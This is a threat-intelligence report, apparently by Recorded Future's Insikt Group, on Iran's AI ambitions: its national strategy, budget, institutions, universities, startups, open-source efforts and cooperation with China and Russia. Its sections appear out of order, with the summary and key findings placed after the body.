Iranian government statements, press releases, leadership speeches, academic journals, industry websites, and news media, all of which provide key insights into the development and deployment of AI in Iran. However, these sources often provide broad knowledge about Iran’s ambitions or intentions regarding AI and lack details on the specific models, technology, or deployment of AI in support of national security objectives. Western AI companies, such as OpenAI, Google, and Microsoft, as well as global cybersecurity and military experts, offer additional perspectives and analysis of Iran’s AI use cases.</p>\n        <h3>National AI Strategy Development and Challenges</h3>\n        <p>Following its leader’s 2021 directive, the Islamic Republic has striven to develop and integrate AI through the establishment of various bureaucratic entities and industry initiatives. Iran’s progress in AI advancement is almost certainly limited by two factors: (1) its economic and commercial isolation and (2) its government control and oversight. After years of international sanctions and commercial isolation, Iran’s technological advancement, particularly in security-related industries such as defense, energy, and maritime shipping, depends on indigenous and domestically engineered capabilities. Iran <a href=\"https://www.atlanticcouncil.org/blogs/iransource/iran-s-troubled-quest-for-food-self-sufficiency/\">strives</a> for self-sufficiency in various sectors, including food and energy, and this concept of a “resistance economy,” which <a href=\"https://www.washingtoninstitute.org/policy-analysis/khamenei-attempts-restore-optimism-and-normality-nowruz-speeches\">underpins</a> Iranian strategic culture and economic development priorities, very likely shapes the development of Iran’s AI ecosystem. The Iranian government almost certainly <a href=\"https://www.cambridge.org/core/journals/iranian-studies/article/artificial-intelligence-in-iran-national-narratives-and-material-realities/9D2C33F3F1BC459712651443F1D203FB\">disseminates</a> the narrative that Iran is a competitor in an AI global race and seeks to prove its technological prowess. As a result of Iran’s national ambitions for AI, its development ecosystem is very likely government-driven, in partnership with private industry and academia. Iranian technological leaders very likely understand that foreign advances in AI computing power, including private technology companies, can both benefit and augment Iran’s own internal efforts and uses. This dynamic — a top-down national strategy and AI technical development framework that is supported rather than driven by Iran’s own private sector innovation — is likely to limit the potential of Iran’s AI advances.</p>\n        <p>Iran’s own private sector innovation is likely stifled by its economic isolation and its dependencies on government funding and direction. Iran claims that the government’s expanded support to the tech sector resulted in a surge of Iranian venture capital firms, accelerators, and “innovation centers” between 2019 and 2020, as these firms provided localized solutions amid global supply chain disruption (after the US withdrew from the Iran nuclear agreement and re-imposed sanctions). However, according to a 2022 United Nations <a href=\"https://www.undp.org/publications/mapping-existing-innovation-ecosystem-ir-iran\">report</a> on Iran’s innovation landscape, sanctions significantly hampered Iran’s “startup ecosystem” and the domestic and foreign appetite for investments in Iranian technology startups after 2018 was “reduced substantially.” Iran’s challenges and limitations are reflected in several global indices that analyze and measure AI advances and technological innovation across countries. Stanford University’s Global AI Vibrancy Tool, which <a href=\"https://hai-production.s3.amazonaws.com/files/global_ai_vibrancy_tool_08.27.24.pdf\">defines</a> AI vibrancy as “the level of activity, development, and impact of AI technologies within a country,” does not include Iran in its analysis of 36 countries leading AI-related metrics. Iran is ranked 64th in the Global Innovation Index, which <a href=\"/research/irans-ai-ambitions-balancing-economic-isolation-national-security-imperatives?host=https%3A%2F%2Fwww.recordedfuture.com\">reflects</a> a notable improvement over the last ten years. However, Iran’s institutional, regulatory, and business environments ranked 127th, 131st, and 128th, respectively, underscoring the systemic challenges to Iran’s innovation ecosystem. Oxford Insights <a href=\"https://www.wipo.int/web-publications/global-innovation-index-2024/assets/67729/2000%20Global%20Innovation%20Index%202024_WEB3lite.pdf\">ranked</a> Iran 91st of 193 countries in the 2024 “Government AI Readiness Index,” a three-position improvement from its 2023 ranking, but scored lowest in the “vision,” “adaptability,” and “maturity” dimensions.</p>\n        <p>In 2022, Iran revealed fifteen policies shaping its AI development roadmap. A key theme underpinning these policies was the importance of national research centers, private industries, and universities working together to advance Iran’s AI development. Notably, two of the policies sought to support the private industry’s use of “academic plans” and to increase private industry’s trust in universities, likely suggesting a divide between Iran’s technical industry and its academic institutions. Another key theme of the policies was increasing foreign engagement and cooperation between Iranian and foreign academic centers. This likely reflects Iran’s interest in leveraging foreign partnerships, particularly with countries that are adversarial to the West, in the AI field.</p>\n        <p>In July 2023, a study from the Journal of Science &amp; Technology Policy found that “the artificial intelligence ecosystem in [Iran] has not yet taken shape in the true sense” and “there is still no relative consensus among actors for dividing tasks and missions.\" Less than a year later, the same journal — which is affiliated with Iran’s National Science Policy Research Center — published a Nowruz 1403 (Persian new year, corresponding with March 2024) special edition entitled “Generative Artificial Intelligence: Multiple Perspectives on Opportunities, Challenges, and Implications in Research, Practice, and Policymaking” that examined the “abundant ethical and legal opportunities and challenges” of AI, specifically ChatGPT’s “practical, ethical, semantic, and policy challenges.\" The study’s conclusion highlighted the “lack of well-developed ethical guidelines” and noted that it is “vital that new rules be established to govern these instruments, and given their global nature, international coordination is also necessary to maximize their benefits.” The 43 “expert” authors from various business and technological fields disagreed about whether ChatGPT should be restricted or legalized in Iran.</p>\n        <p>Iran’s bureaucratic challenges in the AI realm, including changes in presidential administrations and a plethora of organizational stakeholders with overlapping responsibilities, likely limit the country’s ability to implement an overarching strategy for its AI development. Tehran’s policy toward AI is overseen by Iran’s Supreme Council of the Cultural Revolution (SCCR) — a strategic policy body that answers only to the Supreme Leader — whose approval in June 2024 was required to move forward with the National AI Organization, steering council, and the document’s “generalities.” This approval involved review of the AI organization’s statutes and 18,000 supporting documents to ensure the project was not “tainted by Western influence.” The SCCR established a specialized Commission for AI in September 2022 composed of officials from all armed forces branches, the General Staff of the Armed Forces, the Office of the Supreme Leader, the Ministry of Intelligence, and the Ministry of Higher Education. In January 2025, Pezeshkian noted the importance of AI development in a meeting with the SCCR, asserting that “any delay or backwardness in the development of AI in Iran would be damaging and irreparable.” Domestic critics of Iran’s AI policy have raised concerns about the “unstable decisions, constant policy changes, and lack of a clear roadmap” that has hampered the country’s AI program. For example, in December 2024, Afshin announced that the cabinet was drafting a charter for the National AI Organization that would focus on the organization’s role in planning and overseeing AI activities; three months later, semi-official news agency Tasnim News suggested the possibility that the National AI Organization could be dissolved, raising a “series of contradictions” and “unanswered ambiguity.”</p>\n        <h3>AI Budget</h3>\n        <p>Documentation of Iran’s investment and funding of AI is opaque, but even with conflicting information, Iran’s lack of significant AI funding compared to its competitors will likely imperil its top-ten AI ambitions. The SCCR reportedly allocated a budget totaling 3.5 trillion Tomans (“over 83 million dollars”) in its approval; Iran’s initial operating budget for AI has also been reported as $50 million USD. According to the Tehran Times, 50 trillion rials (“some $100 million”) has been allocated for the development of AI operators during Persian year 1403 (between March 2024 and March 2025). In January 2025, Iran’s National Development Fund — independent of the Iranian government budget — agreed to allocate $15.6 million USD to AI projects in universities and private research centers, while another $100 million USD will be provided in the form of loans. These funding numbers lag significantly behind the AI budgets of regional competitors like the United Arab Emirates (approximately $1.2 billion USD) and Saudi Arabia (approximately $2 billion USD).</p>\n        <h3>Government Entities</h3>\n        <p>Insikt Group identified a number of government entities that are involved in the direction, strategic planning, and national coordination for the development of Iran’s AI capabilities. The protracted process for the formulation of Iran’s national AI strategy document, which has <a href=\"https://ideaagency.net/irans-advancements-in-ai-collaboration-on-national-strategy/\">involved</a> a cross-agency collaboration process with multiple stakeholders, likely reflects a bureaucratic competition for influence and ownership of AI leadership within the Iranian government. The division of power among various government elements has likely hampered Iran’s ability to form a cohesive AI strategy and development plan.</p>\n        <div>\n          <div>\n

      </div>\n          </div>\n        </div>\n        <p><strong><em>Table 1:</em></strong> <em>Iranian entities involved in AI strategy (Source: Recorded Future)</em></p>\n        <p>Iran’s military plays a key role in technological developments through civil-military cooperation, which very likely extends into the AI realm. Iranian armed forces, including the Islamic Revolutionary Guard Corps (IRGC), have <a href=\"https://cira.exovera.com/research-analysis/irgcs-involvement-in-science-technology-parks-blurs-line-between-civilian-military/\">affiliated</a> universities and science and technology (S&amp;T) parks and run their own technology parks as “incubators.” For example, Imam Hossein University — affiliated with the IRGC — has a technology center and hosted “The International Conference on Artificial Intelligence and the Future Civilization” on January 29, 2025. Iran’s military branches from the Army and IRGC’s ground, naval, and air forces each have their own research and development entity, <a href=\"https://link.springer.com/chapter/10.1007/978-3-031-58649-1_19\">referred</a> to as a Research Self-Sufficiency and Jihad Organization (RSSJO), that conducts specialized and tailored R&amp;D for the unique needs of their respective forces. These RSSJOs are likely involved in independent efforts in defense-related R&amp;D and in cooperation with academic institutions; they are likely integrating AI development into those efforts. Iran’s Ministry of Defense and Armed Forces Logistics (MODAFL) also likely has a key role in defense-related AI development, having signed partnership agreements with 80 universities and 800 industrial towns in Iran.</p>\n        <h3>Government Initiatives</h3>\n        <p>Announcements by the Vice Presidency for Science, Technology and Knowledge-based Economy regarding its AI development initiatives likely suggest Iran is working to develop a sovereign AI capability — meaning an Iranian national capability to <a href=\"https://aimagazine.com/articles/what-is-sovereign-ai-and-why-is-it-gaining-traction\">produce</a> AI using its own infrastructure, data, workforce, and business networks through the development of foundation models trained on local datasets that reflect local language and culture. Hossein Afshin, Iran’s Vice President for Science, Technology and Knowledge-based Economy, hosted a meeting with the “Technology Group” from Tarbiat Modarres University on December 1, 2024, during which he reviewed the team’s progress, requirements, and support mechanisms for its “Project for Designing a Large Native Iranian Language Model.” He subsequently announced on December 3, 2024, that a prototype of Iran’s “national AI operating system,” which was “designed to host AI algorithms locally,” was expected in six months. Iran intends to launch the country’s first GPU data center by 2025 and plans to establish its first AI park — to “showcase the technological developments of the country and provide practical AI-related services to the people” — within the next two years.</p>\n        <p>On March 15, 2025, Vice President Afshin unveiled Iran’s national AI platform and announced a phased rollout of the project, framing it as a strategic move in a global “war of chips and algorithms.” The platform’s initial testing and optimization are planned for the first half of 2025, followed by limited access for technology experts and companies in the third quarter, a public beta release in September 2025, culminating with a public release in approximately March 2026. Over 100 Iranian professors and researchers collaborated on the project, which was developed in cooperation with Sharif University of Technology — an institution that is <a href=\"https://www.opensanctions.org/entities/NK-nxBVUwhmE8JFVPkiVzKVaS/\">sanctioned</a> for its links to the IRGC and MODAFL related to military and ballistic missile technology development. An expert developer and representative of Sharif University, Hossein Asadi, noted that the AI platform was developed using an open-source framework and specifically highlighted that it would be “entirely independent, with no reliance on foreign APIs [application programming interfaces],” ensuring the platform’s services would continue without disruption “even if the country’s internet were to be completely disconnected.”</p>\n        <p>Iran almost certainly seeks to leverage domestic resources to support these development initiatives. On December 13, 2024, Afshin declared the government’s intention to jumpstart domestic chip production for AI through the “Sahand National Project” (“پروژه ملی سهند”). The Sahand National Project is consistent with Iran’s focus on leveraging its own human and natural resources to deliver indigenous technological solutions and is likely a reaction to an anticipated increase in economic isolation under the US presidential administration of Donald Trump. The US government <a href=\"https://bidenwhitehouse.archives.gov/briefing-room/statements-releases/2025/01/13/fact-sheet-ensuring-u-s-security-and-economic-strength-in-the-age-of-artificial-intelligence/\">announced</a> export restrictions on January 13, 2025, which are designed to curtail the sale of chips with high-computational graphics processing unit (GPU) power for AI advanced development (such as Nvidia’s A100 and H100 chips) to sanctioned countries like Iran.</p>\n        <p>According to Iranian media, the project’s aim is to manufacture “nine-nines” (99.9999999%) purity silicon wafers, the first step in setting up a domestic supply chain for microchips, with a view to open Iran’s first GPU data center by “early 2025.” While public information on the project remains limited, its reported location — in Sahand, East Azerbaijan province — would likely have been chosen for its proximity to <a href=\"https://www.crunchbase.com/organization/sahand-industrial-group\">Sahand Industrial Group</a> (SIG), Iran’s leading glass and silica producer, and the Sahand University of Technology, which has specialized laboratories in material and nanomaterial engineering. Using satellite imagery, Insikt Group identified a new two-million-square-foot facility under construction near an existing SIG silica manufacturing plant in Sahand, showing significant investment in the region’s industrial capabilities.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"iran-ai-004.png\" src=\"https://www.recordedfuture.com/media_1dd6109a1a5e92324f1d8f931d86e745a95136839.png?width=750&amp;format=png&amp;optimize=medium\" width=\"638\" height=\"205\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 4:</em></strong> <em>Satellite imagery of a two-million square foot facility between May 2020 and May 2024 near an SIG silica plant in Sahand, East Azerbaijan, Iran (Source:</em> <em><a href=\"https://earth.google.com/web/@37.98555449,46.05734324,1318.43207051a,2331.38762272d,35y,356.98663711h,0t,0r/data=ChYqEAgBEgoyMDIwLTA1LTEzGAFCAggBMikKJwolCiExRjlFYTB2c1g5MUJONlFrSGlxZUlYTTZKckFvSEpWcGQgAToDCgEwQgIIAEoICJag4dgDEAE\">Google Earth</a>)</em></div>\n          </div>\n        </div>\n        <p>Another government initiative announced on January 11, 2025, by Afshin aims to establish a hub for AI innovation in the oil and gas industries on Kish Island, Southern Iran, in association with the Persian Gulf Petrochemical Industries Company and the Kish Free Zone Organization. The location choice likely enables the Iranian government to unlock three benefits for the acceleration of AI development: the Kish Free Zone’s lax foreign investment and fiscal policies to encourage foreign direct investments (FDI); existing infrastructure, including an international airport and ports that can be leveraged for international transit; and lax entry visa requirements on Kish Island that <a href=\"https://travel.state.gov/content/travel/en/international-travel/International-Travel-Country-Information-Pages/Iran.html\">enable</a> reputable Iranian academic institutions (such as Sharif University of Technology, which has an international campus in Kish) to attract foreign talent and investment.</p>\n        <p>Iran has announced several AI-enabled tools for the benefit of the Iranian government and society. Alongside his announcement of Iran’s domestic chip production project in December 2024, Afshin also declared that the Iranian government has prioritized the development of “AI assistants” available to government officials, developed “in collaboration with universities” with a team of over “70 expert professors.” The AI assistants are reportedly expected to help government ministers to “extract both laws and regulations and production-related issues from data” and “make suggestions in decision-making.” In August 2024, Iran’s National Cyberspace Center announced the Arbaeen Artificial Intelligence Assistant (which references Arbaeen, a Shi’ite holy day, during which Shi’a Muslims <a href=\"https://www.newarab.com/features/explainer-what-arbaeen\">make</a> a pilgrimage to Iraq) was “a guide for pilgrims to access routes and processions, management of information for scheduling ceremonies and events, as well as the status of health and medical services, weather conditions, and even cultural and linguistic guidance online.” In November 2024, Iran’s national religious headquarters, located at Qom Seminary, launched an “indigenously developed platform that uses AI to answer questions and remove doubts on religious issues.” Dubbed Deendaan, the platform was introduced by the seminary’s National Center for Answering Religious Questions. Another entity in Qom, the Noor Computer Centre for Islamic Sciences Research, is seeking to <a href=\"https://archive.is/npvsM#selection-2349.43-2349.93\">incorporate</a> AI in its use of religious texts and data to “accelerate the Islamic studies of senior clergy and speed up their communication to the public.”</p>\n        <h3>Academia</h3>\n        <p>Iran’s most globally recognized AI innovation, the Surena IV humanoid robot, was developed by Iran’s academic sector, underscoring the key role of universities and research institutes in Iran’s AI ecosystem. Created at the Center of Advanced Systems and Technologies (CAST) at the University of Tehran, the robot’s fourth generation uses the “Robot Operating System” for “state monitoring, real time implementation of algorithms, and simultaneous running of several programs.” The robot was <a href=\"https://www.asme.org/topics-resources/content/10-humanoid-robots-of-2020\">listed</a> as one of the top ten humanoid robots in 2020, according to the American Society of Mechanical Engineers. In addition to developing the Surena humanoid, CAST has a “portfolio” of projects related to various fields, including “mechatronics, robotics, and intelligent systems inspired by nature,” as well as “aquatic inspired” robots and those “inspired by birds.”</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"iran-ai-005.png\" src=\"https://www.recordedfuture.com/media_11657a8f5f7068c580f3a81d093849e164dc6849c.png?width=750&amp;format=png&amp;optimize=medium\" width=\"728\" height=\"442\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 5:</em></strong> <em>Surena IV, developed at the University of Tehran (Source:</em> <em><a href=\"https://spectrum.ieee.org/iran-surena-iv-humanoid-robot\">IEEE</a>)</em></div>\n          </div>\n        </div>\n        <p>Leading Iranian universities in the field of AI <a href=\"https://edurank.org/cs/ai/ir/\">include</a> the University of Tehran, Amirkabir University of Technology, and Iran University of Science and Technology, all located in Tehran. According to the state-run news outlet Tehran Times, over the last ten years, the most “scientific productions” in artificial intelligence have been associated with Tehran University, Tabriz University, and Amirkabir University of Technology. However, these universities likely remain low on global rankings for AI research; the University of Tehran, widely recognized as the best higher education institution in Iran, <a href=\"https://edurank.org/uni/university-of-tehran/rankings/\">ranks</a> at number 201 globally for AI. Edurank data suggests that Iran’s top three universities are ahead or on par with their Russian peers (Moscow State University, St. Petersburg State University, and the National Research University) but far behind China (Tsinghua University, Harbin Institute of Technology, and Shanghai Jiao Tong University) in terms of production (number of publications) and influence (number of citations). Iranian national investment in AI research is likely less than Russian investment, but its academic citation numbers are greater than Russia’s, likely reflecting that Iran’s AI academics maintain disproportionate influence in their field relative to their Russian counterparts.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"iran-ai-006.png\" src=\"https://www.recordedfuture.com/media_1a1bdb0a50e08799c7791c53aea8878241387270b.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1394\" height=\"850\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 6:</em></strong> <em>Top three universities in Iran, Russia, and China by papers and citations in the field of AI (Source:</em> <em><a href=\"https://edurank.org/cs/ai/\">Edurank</a>)</em></div>\n          </div>\n        </div>\n        <p>In the absence of a vibrant private AI sector, the Iranian government is likely reliant on academics specialized in AI for government projects at the expense of cutting-edge research. Iranian media boasted that “70 expert professors” were working to design an AI platform for government ministers. Sharif University of Technology, ranked fourth in Iran in AI, is likely a key partner for government projects, such as Iran’s national AI platform. The government demand for expertise likely represents a misallocation of research talent towards state-mandated engineering projects, which likely impedes Iran’s research potential. However, Iranian academic centers may also be exploring open-source AI development, which likely encourages innovation. For example, in November 2024, Amirkabir University, in collaboration with AI developer Part AI, announced the development of the “most comprehensive and powerful evaluation system for Persian language models,” known as <a href=\"https://huggingface.co/spaces/PartAI/open-persian-llm-leaderboard\">Open Persian LLM Leaderboard</a>, which includes over 40,000 samples and tracks the performance of 25 major open-source models at Persian-language tasks. Part AI has also published six open-source models, including Persian finetunes of Meta’s Llama 3.1 and Google’s BERT models.</p>\n        <p>A search of recent and upcoming conferences related to AI suggests Iran’s academic sector is exploring AI applications in several sectors, including medical sciences, telecommunications, electrical engineering, education, mining, and industry. In 2024, Iran held a number of inaugural national conferences on specific topics, very likely suggesting the concept of how AI can benefit specific industrial sectors is still nascent in Iran. For example, in October 2024, Iran held the first national conference on AI in education and learning; in May 2024, Iran held its first national conference on AI and the Internet of Things; in April 2024, it held its second national conference on Digital Transformation and Intelligent Systems.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"iran-ai-007.png\" src=\"https://www.recordedfuture.com/media_114f92f12d16c803f20e9807da89acf6aaaf41fb4.png?width=750&amp;format=png&amp;optimize=medium\" width=\"496\" height=\"703\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 7:</em></strong> <em>Poster of international AI conference which notes the cooperation “with prestigious universities and scientific centers of Iran and the world” (Source: Imam Hossein University)</em></div>\n          </div>\n        </div>\n        <p>Iranian universities are very likely driving international engagement by hosting conferences on AI. A review of international AI-related conferences held in Iran in 2024 and planned for 2025 highlights a wide range of foreign academic participants, including academics from Austria, Australia, Canada, China, France, Italy, Iraq, Malaysia, Russia, Spain, Vietnam, and the United Kingdom. Iranian academic output on AI likely benefits from strong ties with Iranian-American researchers and collaboration with US academic institutions. An Iranian study of domestic output of AI research between 1978 and 2022 found that US researchers were the most frequent international co-authors on Iranian AI research. However, Iranian academic AI research likely remains of limited international influence. 19.9% of Iranian AI papers during this period received no citations, with the majority receiving between one and five citations.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"iran-ai-008.png\" src=\"https://www.recordedfuture.com/media_18b93789615dde3cf63c5795aa5ac9cd9dcb1bbb2.png?width=750&amp;format=png&amp;optimize=medium\" width=\"654\" height=\"407\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 8:</em></strong> <em>Network map of countries co-authoring with Iranian AI researchers between 1978 and 2022, based on the Scopus database (Source: Shahed University)</em></div>\n          </div>\n        </div>\n        <h3>Private Technology Companies</h3>\n        <p>Iran’s private sector currently faces significant challenges in the face of international sanctions and lack of global competitiveness, including the inability to retain top talent, the absence of foundational AI model companies, low capital expenditures on AI by existing major players in the technology sphere, and a nascent venture capital (VC) ecosystem.</p>\n        <p>Iran almost certainly <a href=\"https://www.mei.edu/publications/escalating-emigration-and-drought-irans-it-industry\">suffers</a> from a significant talent outflow of skilled workers in technology and AI. According to a 2021 report by the Iran Migration Observatory, 50% of Iranians <a href=\"https://www.mei.edu/publications/escalating-emigration-and-drought-irans-it-industry\">involved</a> in startup communities and 44% of graduates were planning on emigrating, citing unpredictable internet regulations, censorship, and lack of wage competitiveness as direct factors. In December 2024, Iran’s Vice President Afshin announced a new regulation offering monthly grants of approximately 15 million Tomans ($3,564 USD) for PhD students to encourage research and scientific activities, stressing the importance of preventing talent migration.</p>\n        <p>Despite talent shortages, Indian data provider TraxCN has <a href=\"https://tracxn.com/d/artificial-intelligence/ai-startups-in-iran/__aWyQstgrq_MtBd_T7d2d9-itkASMubg8G_HbLca8W_8/companies\">identified</a> at least 85 companies in Iran advertised as operating in the field of AI, with a majority focusing on developing AI enterprise applications and tools for healthcare, agriculture, and finance. Several companies provide chatbot services and LLMs, including Persian-language chatbots; however, it remains unclear whether they are developing proprietary models rather than deploying existing open-source models. Additionally, TraxCN considers that seventeen (20%) of these companies are currently “deadpooled” (no longer in business) and 60 (80.5%) remain unfunded, indicating that despite government efforts to incentivize AI startups, the average Iranian AI startup is doomed to fail in raising funds or operating sustainably. Iranian AI website Hooshio published a list of 29 Iranian AI companies, highlighting the Parth AI Research Center as “one of the top five companies in the Middle East” with more than 150 specialists in AI. The company claims to have Iran’s “biggest AI research center” with a department for machine vision, natural language processing (NLP), speech processing, and data analysis, as well as an AI college.</p>\n        <p>Iran’s private tech sector is likely trying to financially motivate AI innovation and engage with Iran’s developer community. Digikala, Iran’s <a href=\"https://www.crunchbase.com/search/organizations/field/organizations/location_identifiers/iran\">biggest</a> technology and e-commerce company (valued at approximately $500 million USD as of August 2024), <a href=\"https://archive.ph/c9swn\">hosted</a> an AI hackathon in March 2024 with a first-place prize of 60 million Tomans (approximately $14,258 USD). Notably, the hackathon’s rules <a href=\"https://archive.ph/c9swn\">banned</a> participants from using Western AI models (listing models from Western companies like OpenAI, Anthropic, and Cohere), likely intending for participants to focus on using open-source models for hackathon entries.</p>\n        <p>Unlike their Western and Chinese counterparts, Iranian VC funds are likely limited in their ability to fund and support a domestic AI startup ecosystem to fulfill national security and economic priorities, with startups <a href=\"https://www.statista.com/outlook/fmo/capital-raising/traditional-capital-raising/venture-capital/iran\">forecasted</a> to raise $28.13 million USD in capital in 2025 across all sectors. Iran’s Pardis Technology Park (PTP), dubbed “Iran Silicon Valley” and operating “under the auspices of” the Vice Presidency for Science, Technology, and Knowledge-based Economy, is “the most significant center for developing startups and knowledge-based companies and commercialization of technology and innovations in Iran.” PTP, which is part of the Iran International Innovation District, boasts 25.5 million EUR of foreign investments in its companies over the last five years and is also supported by the Iran National Innovation Fund, Iran’s version of a venture capital and private equity firm.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"iran-ai-009.png\" src=\"https://www.recordedfuture.com/media_1ed3bd46a1ec67e5d3c34ac38643bb19c12f4a3bb.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1200\" height=\"742\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 9:</em></strong> <em>Forecasted capital raised by startups for 2025 in China, Russia, and Iran (Source: Statista</em> <em><a href=\"https://www.statista.com/outlook/fmo/capital-raising/traditional-capital-raising/venture-capital/china#:~:text=The%20country%20in%20China%20is,US%2449.17bn%20in%202025.\">1</a><u>, 2</u>,</em> <em><a href=\"https://www.statista.com/outlook/fmo/capital-raising/traditional-capital-raising/venture-capital/iran\">3</a>)</em></div>\n          </div>\n        </div>\n        <h3>Open Source</h3>\n        <p>Open-source communities <a href=\"https://www.gov.uk/government/publications/ai-opportunities-action-plan-government-response/ai-opportunities-action-plan-government-response\">play</a> an important role in the development of AI capabilities, as open-source AI models can <a href=\"https://web.archive.org/web/20190226132342id_/http://pdfs.semanticscholar.org/71bc/34f9611e020e5d673b03af354d45b022018d.pdf\">lower</a> research and development costs, present opportunities for technology transfers, and reduce dependency on models developed by foreign companies. Iran’s open-source community almost certainly lags behind in terms of developing home-grown AI models, finetunes, and datasets.

ODISTC was set up “to serve as a foundation for increasing scientific, technological and innovation communications with other countries, as well as securing a significant share of the regional and global trade of knowledge-based products.” Among the services offered in ODISTC’s “Technological Exchange Office” is “bilateral scientific and technology cooperation in the form of joint research funds with the [sic] countries like China and Russia.” More details pertaining to Iran’s cooperation with China and Russia are discussed below.</p>\n        <h4>China</h4>\n        <p>Iran’s technological cooperation with China is very likely a key strategic interest for Iran’s AI development. In 2021, Iran’s Strategic Council on Foreign Relations promoted building relationships between Iranian and Chinese technology companies and higher education institutions. AI was specifically mentioned as part of the Iran-China 25-year Comprehensive Partnership, officially signed in March 2021. A leaked version of the plan, sourced from Iran’s Ministry of Foreign Affairs and <a href=\"https://www.wilsoncenter.org/sites/default/files/media/uploads/documents/MEP_200831_OCC%2038%20v3%20%281%29.pdf\">reported</a> by the Wilson Center, proposed the cooperation involved “introducing joint pilot projects in the fields of smart technology and artificial intelligence.” Second to the sale of its oil to China, Iran likely <a href=\"https://link.springer.com/chapter/10.1007/978-981-19-6700-9_32\">views</a> AI development and technological exchanges as a top priority for its bilateral relations with China, and China’s challenge to US dominance in AI development aligns with Tehran’s goal to oppose US hegemony.</p>\n        <p>China’s use of AI for surveillance and monitoring has very likely been the most robust area for Iran’s foreign AI engagement, enabling Chinese companies to expand their export of specific technologies that facilitate Iranian domestic repression. However, academic and research collaboration is very likely another key area in which Iran’s technology sector is benefitting from the relationship with China. In November 2024, Iranian company Bayan Rayan — the country’s only server producer — received an award at the 26th annual China Hi-Tech Fair (CHTF) 2024. In 2022, an official at Iran’s Islamic Azad University touted the Iran-China agreement as a “golden opportunity to boost cooperation in AI” and benefit from Chinese advancement in the AI field, noting that Iran had 3,000 Iranian students studying in China.</p>\n        <h4>Russia</h4>\n        <p>The anti-West strategic alignment and commercial isolation that Iran and Russia both share, particularly as a result of Russia’s war with Ukraine, has <a href=\"https://www.cna.org/reports/2025/01/The-Evolving-Russia-Iran-Relationship.pdf\">resulted</a> in deeper cooperation in many security-related fields.

In January 2025, Tehran and Moscow signed a comprehensive twenty-year strategic partnership agreement that reinforced areas of ongoing cooperation in the technical sphere, including information and communication technologies, digital development, and higher education. While the text of the agreement does not specifically mention AI, Iran’s Ministry of Foreign Affairs stated the agreement “provides a platform for sharing knowledge and collaboration in fields such as nanotechnology, aerospace, artificial intelligence, and medical sciences” and expands cooperation at the government and academic levels.</p>\n        <p>Leading up to the 2025 comprehensive agreement, a flurry of Iran-Russia cooperation documents and engagements have promoted cooperation on AI. In March 2024, the two countries signed a Memorandum of Understanding to cooperate on ethics in AI, “exchanging experiences in the implementation of the ethical principles of AI.” The agreement specified that the Russian Commission on Ethics in AI would provide training for Iran’s AI and Robotics Development headquarters.

Since the Supreme Leader issued a directive in 2021, Iran has endeavored to develop a national strategy and oversight mechanism for AI and foster a technological ecosystem to drive domestic research and development. However, two key factors — Tehran’s global economic isolation, and its deeply entrenched system of government control and oversight — have almost certainly hindered Iran’s national AI development.\nIn 2024, as Tehran’s support for its proxies Hamas and Hezbollah against Israel embroiled Iran in unprecedented regional conflicts and ongoing cyberwarfare, new insights emerged about how Iran has implemented AI technologies in its national security apparatus. Iran has used AI to bolster its capabilities in four main areas: cyberattacks, influence operations, military and intelligence systems, and domestic repression. These priorities will continue to propel Iran’s development and implementation of AI, almost certainly posing an increasing threat to Iran’s Western and regional adversaries. In cyberspace, AI will likely augment Iranian threat actors’ spearphishing and social engineering tradecraft, while AI’s implementation in Iran’s drone and missile arsenal is likely to pose the greatest physical threat from emerging technology.\nIran’s approach to AI will likely mirror its broader strategic ambitions — to be a regional power and assert its national sovereignty — by building and implementing advanced technological capabilities. Iranian government initiatives are likely to be the driving force behind Iran’s AI development priorities, particularly given the absence of a flourishing AI private sector. While Tehran will promote its own technological prowess and indigenous AI development, the Iranian government is likely to leverage its relationship with China and Russia in various security realms to bolster its AI technology capabilities. Private industry, particularly companies in the AI or technology resources industry, should closely monitor end users of their models or materials to ensure Iranian threat actors are not using their products or acquiring controlled technologies. Similarly, governments should invest in identifying and preventing the Iranian defense industry from acquiring AI technologies that enhance its military capabilities.\nKey Findings\nIran has articulated lofty goals for its AI advancement and seeks to compete in the global AI race, but it is almost certainly hindered by two factors: First, its economic and commercial isolation limits its access to technological resources and human capital. Second, its top-down government control and oversight stifles private innovation in AI.\nTo augment its own indigenous research and development (R&D) capabilities in AI, Iran will likely leverage its bilateral and regional relationships for technology engagement with China, Russia, and other non-Western countries.\nAmidst unprecedented domestic upheaval and regional conflict over the last three years, Iran very likely views AI as a key force multiplier for its national security and defense and has sought to integrate AI into its cyber and influence operations, military systems, and domestic surveillance infrastructure.\nIt is very likely that Iranian threat actors will increasingly use generative AI and large language models (LLMs) to enhance their influence and cyber operations, increasing risk to adversarial governments, as well as their critical infrastructure, technology companies, and other security-related industries.\nIran has very likely endeavored to implement AI in its military defense systems and publicly touts the capability, though its operational uses of the technologies remain unproven.\nIn the domestic sphere, Iran has very likely increased its efforts to deploy AI for morality enforcement and opposition monitoring, to enhance its control over Iranian society, particularly after the Woman Life Freedom protest movement.\nCompanies and governments should maintain vigilance in cybersecurity practices to reduce vulnerabilities to AI-enabled cyber and influence operations and limit Iran’s access to AI resources and expertise that could increase Tehran’s threat to regional security.\nIran’s AI Ambitions\nAt the highest level of its leadership, Iran has recognized and sought to develop an overarching national focus on AI ( هوش مصنوعی in Persian). In November 2021, Supreme Leader Ali Khamenei called AI “an important and futuristic issue” that will “play a role in the future administration of the world,” and urged Iran to become a top ten country in the field of AI. In August 2024, Khamenei urged Iran to “master” and “develop the deep and diverse layers of AI technology,” warning that a global oversight body (similar to the International Atomic Energy Agency [IAEA]) might regulate its use in the future. Khamenei’s stated ambition for Iran’s AI prominence initiated a flurry of government-led activity to develop and implement a national strategy and technological ecosystem to align with the 